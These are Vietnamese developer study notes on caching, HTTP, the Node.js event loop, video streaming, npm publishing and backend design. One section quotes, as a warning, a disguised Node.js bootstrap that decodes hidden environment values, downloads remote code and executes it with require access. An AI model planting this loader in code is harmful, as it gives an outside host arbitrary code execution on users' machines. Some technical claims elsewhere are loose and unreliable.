# Cache memory trong máy
-> Internal memory có 2 loại là cache và main memmory. External memory là CD hay hard drive.
Ứng dụng ban đầu lưu trên hard disk, mở lên sẽ lưu trong RAM, các tác vụ nhỏ sẽ lưu trên cache. Vì cache nhanh hơn RAM, cache dùng SRAM còn nhanh nữa, nhưng bộ nhớ nhỏ và đăt. 
Có 2 loại instruction cache và data cache.
Multilevel cache: Cache L1 là 1 phần của CPU, Cache L2 bên ngoài chip, lớn hơn L1. Cache level1 chú trọng hit time ngắn, cache level2 lớn hơn chú trọng miss rate thấp để vừa có hit time ngắn và miss rate thấp. Nếu dùng 1 cache lớn duy nhất rất khó đạt được điều này.

VD cache có số lượng ô nhớ là 8 block, lấy address của data block %8 sẽ biết cần lưu nó vào block nào. Cache chỉ cần lưu higher order bit là mọi bits trừ 3 bits cuối, sau đó có thể tự compute ra full khi lấy với: [high order bit] + [3 bits cuối là index of block trong cache] 
VD cache có 64 blocks và 1 block 16 bytes thì address 1200 sẽ ánh xạ đến block có thứ [1200/16]=75 vì 1 address refer đến 1 bytes mà. Block thứ 75 trong cache đâu có tồn tại nên nó phải refer đến cache block thứ 75%64=11 để biết hit hay miss

2 cách đồng bộ cache với main memory trong máy
Write through: update cache với main mem đồng thời, sẽ bị chậm => thường dùng
Write back: chỉ update cache, khi data trong cache bị replaced mới update vào mainmem => chỉ dùng khi cache size lớn, cần tốc độ cao k chấp nhận việc update main mem bị chậm

-> 3 loại cache: direct map, fullly associative, n way set associative
- Direct map dùng 1 bảng hash và lưu theo hash để tìm tốc độ O(1)
- Fully associative lưu mỗi cục block data là 1 cục block cache luôn, khi cần tìm sẽ search tuyến tính, lưu vị trí nào cũng được. VD cache có 8 entry thì 1 block có thể lưu vào bất cứ entry nào trong cache đó => Khi search sẽ ngốn O(n) với n là số entry trong cache, chậm hơn direct map O(1) nhưng ít miss hơn, cache size nên nhỏ thôi
- n way set associative thì cache lưu nhiều set theo hash search O(1), rồi search tuyến tính từng entry trong set.
VD: one way tức là số lượng set bằng số lượng entry và giống Direct map
VD: ta nhìn ký hiệu Cache Level2 4-way, tức cache level2 dùng 4 entry trong 1 sets, level 1 k có thông tin nhưng nếu miss thì sẽ search trong level2
Với direct map ta chỉ có 1 cách để replace, còn với associative bắt đầu sinh ra nhiều PP để quyết định bỏ block nào khỏi cache khi 1 block mới cần được thêm vào. VD Dùng LRU là xóa bỏ cái k dùng đến trong ktg xa nhất => Nên dùng khi cần lưu lượng lớn data.

-> Mạng internet có DNS cache, ARP cache. VD: CDN server cung static data cũng có cache. Khi user request data k có trong CDN cache thì CDN server mới request tài nguyên này trên server gốc để lưu vào cache
Load balancer cũng query từ server gốc lưu vào cache của nó. User khác cũng request same content thì có luôn
Message broker như Kafka cũng cache hàng loạt message trên disk của nó cho người dùng lấy nhanh
Full text search engine như Elastic search cũng dùng cache để cải thiện hiệu suất query của người dùng
Database cũng có plan cache, buffer pool lưu kết quả truy vấn, transaction, replication log.

In-Memory Cache là cache ngay trên các ứng dụng FE, Browser, DB, Server đang có
Distributed Cache thì cache là server độc lập, có thể 1, replica or nhiều server phân tán chia sẻ chung, giúp tăng hiệu suất và khả năng chịu lỗi.
Họ có thể chia cache nhiều tầng: dùng In-Memory Cache làm level 1, Distributed Cache cho level 2. Khi restart API server thì In-Memory Cache mất, Distributed Cache vẫn ok.

-> Nếu tự implement cache key-val trong JS thì nên dùng con trỏ yếu như WeakMap 
Best practice tự implement là dùng LRU cache, số lượng cố định, tràn tự xoá cái lâu nhất không dùng. Cũng có kiểu Least Frequently Used.



# So sánh memory các lang, k xét tốc độ
Rust tokio vẫn là ngôn ngữ tốn ít memory nhất so với mọi ngôn ngữ khác
NodeJS tốn ít memory hơn C# khi có 100 ngàn task đồng thời, nhưng khi lên mức 1 triệu task thì C# tốn ít hơn NodeJS, hiẹu năng cũng cao hơn. Do đó dự án lớn ưu tiên dùng C#.



# CRUD
-> Method OPTIONS 
Khi client gửi OPTIONS tới server, server phản hồi với thông tin chứa các HTTP Method mà server support với url đó. 
Trình duyệt tự gửi preflight request như vậy khi FE và server 2 domain khác nhau để kiểm tra xem server có cho phép yêu cầu từ origin đó k. Cùng origin sẽ k gửi preflight request
Đây là cơ chế bảo mật mặc định của trình duyệt để chặn các request không mong muốn mà server k chấp nhận, k cần code gì thêm. Server tự xử lý và trả về các header cors như Access-Control-Allow-Origin, Access-Control-Allow-Methods, Access-Control-Allow-Headers. 

-> POST dùng body, GET dùng params nhưng params bị giới hạn bởi url length.
VD api cần truyền list id thì buộc phải dùng POST vì có thể list vô hạn, chỉ dùng GET khi biết request nhỏ.
API response và request nên trả về tối thiểu data tối ưu băng thông và tốc độ.

DELETE /posts/456?force=true => DELETE k nên dùng với request body vì nhiều framework bỏ qua request body

-> Dùng redirect trong expressjs tự động gửi phản hồi 302 (Found), browser nhận sẽ luôn GET đến url mới.
Chủ động dùng phản hồi 307 (Temporary Redirect) hoặc 308 (Permanent Redirect) thì browser sẽ giữ nguyên method và body để gửi tới URL mới.

VĐ web cổ điển khi user call api tạo user mới qua <form> với POST, server trả về HTML hoặc JSON (200). Browser ghi nhớ request POST cuối cùng và ấn F5 sẽ hỏi resubmit form không, nếu đồng ý sẽ POST lại tạo user lần 2. Khi đó phải fix response redirect sang trang user details để F5 chỉ GET lại thôi.
VĐ chỉ xảy ra khi web submit form PHP chứ SPA như react thì call bằng JS sẽ k bị vấn đề này khi F5.



# Chạy code JS trên máy tải từ mạng về k an toàn
VD: const path = require('path');
require('dotenv').config({path: path.resolve(__dirname, '../.env')});
const axios = require('axios');
const initAppBootstrap = async () => {
  try {
    const src = atob(process.env.DEV_API_KEY);
    const k = atob(process.env.DEV_SECRET_KEY);
    const v = atob(process.env.DEV_SECRET_VALUE);
    const s = (await axios.get(src,{headers:{[k]:v}})).data;
    const handler = new (Function.constructor)('require',s);
    handler(require);
  } catch(error) {
    console.log(error)
  } 
}
module.exports = initAppBootstrap;
=> Nên setup chạy trên Docker cho an toàn



# Event loop của nodejs
Event liên tục được bắt để add vào queue theo thứ tự: Timer event (timeout, interval) -> IO callback (read file) -> Idle (nội bộ) -> Poll (Tìm kiếm sự kiện IO mới đang polling) -> Check (xử lý callback của setImmediate) -> Close Callbacks (xử lý các callback ngắt kết nối) -> quay lại Timer
Khi có event sẽ gửi cho C++ xử lý, xong thì sẽ gửi callback cần thực hiện vào event queue của JS. 

VD gọi setImmediate và setTimeout 0s cạnh nhau cùng lúc, thì thứ tự sẽ phụ thuộc vào cái loop thêm event vào queue kia đang ở giai đoạn Check hay Timer. Nếu là IO callback thì setImmediate thực hiện trước vì nó sang giai đoạn Check trước giai đoạn Timer.
VD khi loop hiện tại kết thúc, trước khi vòng sau bắt đầu sẽ thực hiện theo thứ tự: callback của process.nextTick (callback) -> promise -> callback của setImmediate

-> Mã nguồn core của nodejs gồm 2 thành phần là JS và C++, và C++ bao gồm các xử lý tới các thư viện bên ngoài như V8, libuv.
stack: nơi chứa các lệnh nó chạy theo thứ tự LIFO từ code của ta, thực hiện hàm lần lượt gọi là call stack
heap: nơi chứa các kết quả tạm phục vụ cho việc thực thi các hàm trong stack. Heap càng lớn thì tính toán càng nhanh. Trong C++ thì dùng nó là cấp phát động 
js engine: là nền tảng thông dịch mã JS bao gồm heap và stack. NodeJS xây dựng trên JS engine là V8 Chorme
event: là thứ chứa các thông tin về sự kiện chờ xử lý
callback function và listener: là cái bind cùng với event, là cái sẽ được thực  hiện khi event đó được gọi. 
eventLoop: event loop tồn tại trong chương trình vĩnh viễn miễn chưa bị tắt. 

-> Cơ chế: Mã nguồn thực hiện tuần tự trong V8, gặp hàm thì đưa vào stack và thực hiện, dữ liệu hàm trả ra lưu vào heap. Nếu k có hàm bất đồng bộ thì sẽ thực hiện tuần tự r kết thúc. Nếu có hàm bất động bộ thì request đó sẽ bị đẩy ra ngoài độc lập nhờ WebAPIs (libuv quản lý). Request này sẽ được core của CPU thực hiện, cái này do C++ dùng thread pool xử lý nên các tác vụ ở đây được xử lý đồng thời rồi mới đưa vào event queue (VD nếu ta dùng setTimeout 5s thì WebAPIs sẽ k gửi ngay mà 5s sau mới gửi hàm cho queue, nếu ta fetch API thì multithread của CPU sẽ xử lý). Việc tốn thời gian đó sẽ được xử lý trên C++ Thread Pool, tức là xử lý multithread và còn cho phép ta tương tác với database, file system,.. Cái nào xong trước thì callback của nó sẽ được đưa vào event queue. Event loop kiểm tra nếu stack trống thì kiểm tra callback queue để xử lý, đưa hàm callback của yêu cầu đó vào callstack để xử lý. Nếu callstack vẫn có dữ liệu thì eventqueue sẽ k làm gì cả, chờ stack thực hiện callback event đó xong trống mới vô đc, do đó nếu đưa vào event queue mà k đc thực hiện ngay vì trong queue đó có các thứ khác thì thời gian thực hiện có thể lâu hơn, dẫn đến setTimeout chỉ là thời gian tối thiểu công việc chạy chứ kp thời gian chính xác.
VD cụ thể: ấn nút gọi setTimeout gọi hàm fetch API xong callback in ra màn hình. Compile đến sự kiện -> web APIs lưu nó -> emitter phát sự kiện -> web APIs bắt sự kiện -> đưa cho C++ thread pool xử lý, lúc này nó chả làm gì mà gửi luôn call back của sự kiện cho event queue. Trong lúc này Ct vẫn chạy đồng thời các sự kiện khác và bất đồng bộ thì vẫn đưa vào C++ thread pool xử lý, cái nào xong trước thì gửi vào event queue trước. Event loop lấy nó gửi sang stack. Stack thực hiện nó lại thấy 1 hàm bất đồng bộ là setTimeout lại gửi sang cho WebAPIs. Còn các hàm đồng bộ khác bên trong nó thì vẫn thực hiện tiếp. WebAPIs gửi nó cho thread pool xử lý. Sau ktg setTimeout, pool đó sẽ đưa hàm callback của setTimeout vào queue r vào stack nếu stack trống r thực hiện -> thực hiện thì lại bắt gặp hàm fetch API -> lại đưa sang WebAPIs, nó lại đưa vào pool xử lý bất đồng bộ. Lúc này stack trống và có thể thực hiện tiếp các hàm khác. Pool thực hiện xong sẽ lại đưa callback của hàm đó vào event queue -> event loop lại lấy ra đưa vào stack để thực hiện nếu stack trống, r sẽ chạy in kết quả ra màn hình.



# Tạo streaming server cho video
Nên dùng link youtube, ipfs, đăng lên cdn cloud tốt hơn là dựng 1 streaming server vì tốn kém, trừ các web chuyên về video k muốn phụ thuộc bên thứ 3.
Cơ chế streaming server: Mỗi đoạn của video sẽ gửi http request nhận về 1 lượng bytes kể từ vị trí đó trở đi và tiếp tục cho đến hết video, thông tin này nằm trong header. Ở FE, video player của html5 hỗ trợ sẵn việc gửi request đi và xử lý response nhận về như nào rồi, server chỉ cần gửi lại đúng format response là được

-> Youtube streaming server load video rất nhanh
Video được nén bằng thuật toán AV1 cực mạnh mà k giảm chất lượng, nó dùng nhiều server chuyên dụng để encode vì thuật toán nặng.
Video tải lên cũng được mã hoá ở nhiều độ phân giải. Youtube tính toán cấu hình máy và tốc độ mạng (nếu để auto) để tải video tương ứng.
Ưu tiên load video hơn các component khác trên web
Dự đoán video nào xem tiếp để tải trước phần đầu, dựa vào lịch sử và xu hướng của nhiều người dùng.
Xem đến đâu tải đến đấy, kéo dài đoạn tải trước ra dài để đảm bảo k bị delay.
Băng thông rộng với mạng lưới CDN mọi nơi trên thế giới, dùng cache chuẩn cho video có nhiều lượt xem.

Để xử lý video quá dài, youtube chia hàng nghìn segment nhỏ và đánh dấu phần đầu và phần xem nhiều thì cho cache Edge CDN, phần xem vừa thì cho regional server, phần xem ít giữ trong original server. Video hot trending cũng ưu tiên lên CDN hơn video cũ rồi. Nhiều video chỉ có người xem ở vài quốc gia thì chỉ lưu trên các CDN quốc gia đó.
Phần tải trước dài như nào cũng dựa vào phần sắp có nằm trên original server không, tốc độ xem, pattern đoạn nào hay bị skip.

-> Cách tính lượt view youtube:
Video phải xem quá ngưỡng thời gian tối thiểu, thậm chí có các mốc được mark random phải request đủ các mốc đó mới tính. VD chọn 1 mốc 30s và chia khoảng 30s đó khắp video thay đổi vị trí random liên tục, user phải xem đúng các đoạn đó mới +1 view.
Phát hiện bots và spam với IP tracking 1 máy xem lại nhiều lần 1 đoạn trong thời gian ngắn sẽ bị hạn chế, chỉ tính vài view đầu. Còn có cơ chế tự động check để audit lại view định kỳ nên đôi khi sẽ thấy view giảm. 
Video mới mà có lượt view tăng bất thường sẽ bị đóng băng view vài giờ đầu để đội ngũ vào xác minh thủ công.

VD các nghệ sĩ nổi tiếng có lượt view tăng quá nhanh sẽ k sử dụng MySQL hay MongoDB mà phải dùng cache như redis. 
VD 1 giải pháp chống spam view là lưu IP user vào cache tự hết hạn và bị xóa sau khoảng 5p. Mỗi khi định tăng view bởi 1 ip sẽ check ip vẫn có trong cache thì k cộng view lên. Giúp đảm bảo 1 người trong 5p chỉ được 1 view, video length > 5p.
Lưu id chưa ổn vì nhiều người cùng bắt VPN hoặc cùng 1 mạng LAN sẽ k chuẩn. Giải pháp là giới hạn 1 ip chỉ được max 5 người chẳng hạn. Cách khác là check dựa vào userid, nếu user chưa login thì tạo userid ảo lưu vào cookie gửi kèm lên server thôi. Từ đó check account thay vì check ip.
Thêm rate limit và blacklist chặn ip bất thường. Dùng nginx làm reserve proxy có thể lấy được ip của user trong header trường X-Forwarded-For



# Dùng HTTP2 HTTP3
HTTP1 thì mỗi yêu cầu là 1 connection TCP riêng.

HTTP1.1 duy trì kết nối cho phép nhiều yêu cầu tới 1 server được xử lý trong cùng một kết nối TCP.
Head-of-Line Blocking là hiện tượng response request trước quá lâu làm cho các requests sau bị blocked. Http1.1 đỡ hơn vì có HTTP pipelining cho phép gửi nhiều request đồng thời trên cùng 1 TCP connection mà không cần chờ request trước done, nhưng response vẫn trả về phải đúng thứ tự trong 1 connection, nên HoL k đươc cản hoàn toàn.
Để đảm bảo k bị lỗi đơ luôn, browser duy trì nhiều TCP connection tới server và gửi song song, chứ k chỉ 1 connection.

HTTP2 dùng HTTP stream. Trong 1 TCP connection có thể gửi hàng loạt các stream request và các stream k cần đúng thứ tự nữa, giải quyết vấn đề Head-of-Line Blocking ở tầng application nhưng vẫn bị ở tầng transport với TCP: Client <--- 1 TCP connection [Stream1 header, stream2 header, stream1 data, stream3 header, ...] ---> Server
Server push new data tới client khi có update mà k cần client phải poll liên tục, giảm sô request. Dùng HPACK nén giảm kích thước header. Dùng binary format nhanh hơn so với định dạng văn bản của HTTP/1.x.

HTTP3 dùng protocol QUIC, dựa trên UDP ở ngay tầng transport nhưng nó chỉnh sửa để UDP mà tốt hơn TCP, vẫn có cơ chế phục hồi gói tin khi bị mất.
Client <--- 1 QUIC/UDP connection [Stream1, stream2, stream3, ...] ---> Server
QUIC cũng được dùng để đổi mạng trong điện thoại mà k bị lag vì dùng chung 1 connection id.

-> Nginx và ASP.NET hỗ trợ HTTP3
NodeJS có built-in node:http2 nhưng k dùng được cho expressjs, k hỗ trợ http3. Npm có package spdy hỗ trợ http2 cho expressjs. Khi máy k support http2 sẽ tự downgrade về http1.1 Package này có code ở client side để call api tới server trong trường hợp client side k hỗ trợ http2 => k cần thiết vì FE luôn hỗ trợ
=> Có thể dựng 1 proxy nginx server dùng HTTP2 dù k tận dụng hết dược sức mạnh của HTTP2: Client <-- HTTP2 --> Nginx <-- HTTP1.1 --> Server

-> Từ HTTP2 trở đi, luôn phải có SSL.
Client -> Nginx -> Express server: có thẻ dùng chung 1 ssl cert cho http2 ở 2 connections tới nginx và express server ok.



# Publish package npm
Tạo file readme sẽ hiện trên trang npm
package.json cần các thông tin tối thiểu license, repository, name, version, bugs, homepage có thể hiển thị trên các nền tảng như npm, github, document
Phải push code lên github, nên dùng typescript.
Package phải có 1 file export tính năng cho ứng dụng dùng.
Nếu tạo package cho FE, phải build thành ESModule bằng bundler hoặc code luôn type module.

Tạo 1 folder ngoài cùng để test package
Vào folder test, "npm link <tên package>" => lệnh này sẽ import package vào trong node_modules của folder test. Mọi lệnh sửa ở 1 trong 2 folder test hay folder package sẽ tự sync vào folder còn lại. Cũng có thể dùng để chạy package local cho dự án mà k cần publish lên npm

Tạo tk trên npmjs.com và chạy "npm login"
Check xem trên trang chủ phải chưa có package nào trùng tên
Vào folder package "npm publish"
Khi sửa package, nhớ push lại lên git, sửa version, "npm login", "npm publish" lại

-> yalc giúp dùng local package trong project, thay cho npm link
Vào trong thư mục chứa package: "yalc publish" -> quay lại thư mục chứa package.json của dự án: "yalc add <tên package>" -> yalc sẽ tự thêm vào package.json đường dẫn local đến package và ta import dùng như bth
Để remove package: cd vào folder chứa package.json của project -> yalc remove my-package
Để upgrade package: sửa code package như bth -> lặp lại: cd ../my-package -> yalc publish -> cd ../my-project -> yalc update my-package



# API versioning
Tương tự chia version cho API, có thể chia api khác nhau cho từng thiết bị mobile, desktop.
- Dùng v1 và v2 trong url là pp cũ rồi
- Cách tốt hơn là client gửi kèm trong header VD X-Github-API-Version
Version header thường dùng date như 2022-01-12 thay vì chỉ dùng v1, v2. Nếu k truyền version thì báo lỗi.
Server dùng 1 middleware check header này và redirect về controller tương ứng. 



# Chia file BE hệ thống lớn
Best practice vẫn là chia theo chức năng, bên trong từng chức năng chia theo file từng module => package-by-layer
Chứ nếu chia theo module lỡ cần common lại k có chỗ viết => package-by-feature
Tính năng
  Tính năng con
    Module
      Module con
  Common

1) NodeJS: việc chia file khá hiển nhiên.
src
  api
    v1
    v2
      routes
        auth.route.js
        blog.route.js
      controllers
        auth.controller.js
        blog.controller.js
        index.js
      utils
        staticvalidationhelper.js
        staticutility.js
      middlewares
      models  
        blog.js
        bloguser.js
      services
        jwt.service.js
        blog.service.js
      validations
      logs
  config
    database.config.js
    redis.config.js
    index.js
tests
.env.dev
.env.prod
database.js
index.js => run main function
server.js => start server nodejs
test.http

2) ASP.NET hướng đối tượng phức tạp:
Smp.Web (dự án chính)
  Controllers (folder)
    Voice (folder)
      VoicePolicyController.cs
      VoiceUserController.cs
    Teams (folder)
    HomeController.cs
    EmailController.cs
  Attributes (folder)
    LicenseAttribute.cs
    AuditorAttribute.cs
  Middlewares (folder)
  Models (folder) => model mà chỉ dùng trong Smp.Web
  appsettings.Development.json
  appsettings.Production.json
  Program.cs => chạy hàm main
  Startup.cs => file setup
Voice (folder)
  Voice.Service (library)
    Actions (folder)
      VoiceScanPolicyAction.cs
      VoiceScanCallQueueAction.cs
    Interface (folder)
    Service (folder)
      VoicePolicyService.cs
      VoiceCallQueueService.cs
PowerPlatform (folder)
  PowerPlatform.Service (library)
    Impl (folder)
      PowerApps(folder)
        PowerPlatformPowerAppsService.cs
        PowerPlatformPowerAppsFromDBService.cs
      Environment (folder)
Common (folder)
  Smp.Database.Core (library)
  Smp.Common(library)
    Job (folder)
      IJobAction.cs
      JobContext.cs
    Helpers (folder)
      CipherHelper.cs
      LoginHelper.cs
    Models (folder)
      AuditorInfo.cs
      ProcessCenterModel.cs
  Smp.Service.Common (library)
    GraphClient (folder)
    Login (folder)
      LoginService.cs
      PrincipalService.cs
    Storage (folder)
      BlobStorageService.cs
      TableStorageService.cs



# json-server http-server
FreeAPI: https://jsonplaceholder.typicode.com/posts

-> json-server / lite-server có thể dùng 1 file text bth làm db, chú ý là k có tính ACID của DB bth.

json-server --watch <link đến file db.json> --port 4000 => file db thay đổi sẽ update realtime.
GET /employees/1/?_sort=firstName&amp;_order=desc
GET /employees?_page=7&amp;_limit=20

-> Còn có http-server dựng http server nhanh: cd thư mục -> http-server -c-1 (-c-1 để disable cache) => thêm file html vào thư mục sẽ serve



# Cluster trong nodejs
Cluster trong hệ phân tán là 1 nhóm máy tính (nodes) làm việc cùng nhau để chia tải công việc cùng cung ra 1 dịch vụ. VD 1 hệ thống có 1 chức năng cụ thể, ta mở rộng bằng cách triển khai chức năng đó trên nhiều máy khác nhau mà cấu hình để hoạt động như 1 máy duy nhất cung ra dịch vụ đó
Cluster cũng chỉ việc chạy nhiều process trên cùng 1 máy cung ra 1 chức năng, để tận dụng tối đa số CPU cores trong máy đó. Các instance độc lập nhau về main memory.

-> NodeJS có built-in package cluster giúp chạy nhiều instance của server trên 1 máy => bỏ, thay thế bằng PM2.
URL: https://www.youtube.com/watch?v=_74_z2-uOys
Cơ chế khi chạy sẽ tạo 1 instance isMaster, fork ra hàng loạt instance isWorker chạy dự án lại từ trên xuống. Master có thể dùng quản lý các instance worker. 
Nó tự tận dụng mỗi core CPU là 1 process, mỗi process vẫn đơn luồng trong nodejs, sẽ chịu tải đồng thời tốt hơn. 
Số instance k nên set là max số CPU cores mà nên trải qua thực nghiệm để tối ưu. VD máy 10 cores chạy được 20 instances thì chỉ nên chạy tầm 10 intances, còn lại dành cho task khác để tránh quá tải. Các instance chạy chung 1 cổng và dùng cơ chế load balancing tối ưu của hđh để xử lý, thường là round robin.



# Design ứng dụng chat lớn
-> Có thể dùng socket TLS và buffer streaming message realtime, thay vì dùng cách polling liên tục database để check thay đổi
Dùng firebase hỗ trợ sẵn, nó tạo 1 connection client server giống như socket và server sẽ gửi về từng client khi có sự thay đổi.

-> Có nhiều mô hình:
- 1 db đồng nhất và user pull từ đó về => chỉ cho dự án nhỏ
- Message riêng cho từng user. Tiện cho các hành động 1 user xoá message, 1 user khác k xoá message, 1 user save tin nhắn.
Để tránh ngốn db, group nhỏ thì push message tới từng user ok, group lớn thì chỉ gửi message cho các user online thôi, user offline phải tự pull về.

Bảng user, group/conversation, conversation_members/group_user
Bảng offline_message nếu có user offline thì khi online sẽ query từ đây về r xoá khỏi bảng.
Bảng messages lưu box từng user, mỗi user lưu message độc lập. Có thể lưu message state của từng user như đã đọc đến đâu (last_read_message_id), tin nào pinned, unread_count

--> Bảng messages lưu box từng user có thể dùng phương pháp partitioning chia table trong 1 db hoặc sharding theo sharekey chia mỗi người 1 db riêng.
A nhắn cho B thì tin nhắn có các trạng thái khác nhau là đang gửi, đã gửi, gửi lỗi, đã xem. Khi gửi vào box chính thành công thì coi là thành công, sau đó mới phân bố tới từng user.
Tối ưu tránh duplicate data thì message lưu riêng duy nhất và từng box của user chỉ lưu id đến message thôi.
Để tránh user mỗi khi vào sẽ query lại tất cả message, ta thường chỉ load 1 vài message gần đây, và lưu offline trên máy user, khi vào chỉ lấy các tin mới thôi.
Dùng cache lưu user online hay offline để truy cập cho nhanh. VD user X online sẽ lưu vào cache là online, server check bạn bè của X mà online thì báo là X đang online. Để check X online thì có nhiều cách như ping 30s 1 lần api heartbeat, hoặc check đang có socket connection thì lưu online.

--> Tối ưu kết hợp cả push và pull trong ecommerce:
Với khách hàng thường xuyên online ta push thông báo tới, khách hàng ít online ta cho họ pull. Khách hàng online ít nhưng có đăng ký thông báo mã giảm giá thì push cho họ mã, còn các thông báo khác vẫn để họ pull.



# Other
-> NodeJS xd trên nền tảng Javascript V8 Engine tốc độ cao, mã nguồn mở. Engine gồm heap và stack, tải NodeJS là tải engine này về
Javascript engine là trình thông dịch mã js. Ngoài V8 thì cũng có các js engine khác như: SpiderMonkey(FireFox), Hermes(ReactNative), Chakra(IE), JavascriptCore(Safari).

-> Daemon là 1 loại chương trình trên các hệ điều hành like-unix hoạt động ẩn trong background. Các tiến trình daemon thg kết thúc bằng d như inetd, httpd, sshd, ipd. Các tiến trình daemon không thể bị gián đoạn và chỉ hoạt động khi có đầu vào, tách ra khỏi tiến trình gốc.

-> file.mjs là ES module js, file.cjs là file dùng common js. Có thể import lẫn nhau
Nodejs dùng .js sẽ tự dùng commonjs, muốn dùng .js là es module phải thêm type module.

-> Về tốc độ, thư viện HyperExpress của nodejs là nhanh nhất > nitro > express.js
HyperExpress thậm chí nhanh hơn Deno nhưng vẫn thua Bun.
